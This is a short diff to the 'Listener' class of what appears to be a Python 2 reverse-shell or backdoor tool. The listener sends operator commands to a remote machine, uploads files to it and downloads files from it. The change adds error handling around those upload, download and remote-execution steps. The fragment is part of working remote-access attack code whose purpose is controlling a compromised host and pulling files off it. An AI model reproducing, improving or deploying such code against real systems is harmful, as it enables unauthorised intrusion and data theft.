@@ -58,16 +58,19 @@ class Listener:
             command = raw_input(">> ")
             command = command.split(" ")  # Take command as an array
 
-            # Reverse command upload
-            if command[0] == "upload":
-                file_content = self.read_file(command[1])
-                command.append(file_content)  # Add file content to the send data
+            try:
+                # Reverse command upload
+                if command[0] == "upload":
+                    file_content = self.read_file(command[1])
+                    command.append(file_content)  # Add file content to the send data
 
-            result = self.execute_remotely(command)
+                result = self.execute_remotely(command)
 
-            # Reverse command download
-            if command[0] == "download":
-                result = self.write_file(command[1], result)
+                # Reverse command download
+                if command[0] == "download" and "[-] Error" not in result:
+                    result = self.write_file(command[1], result)
+            except Exception:
+                result = "[-] Error during command execution"
 
             print(result)
 
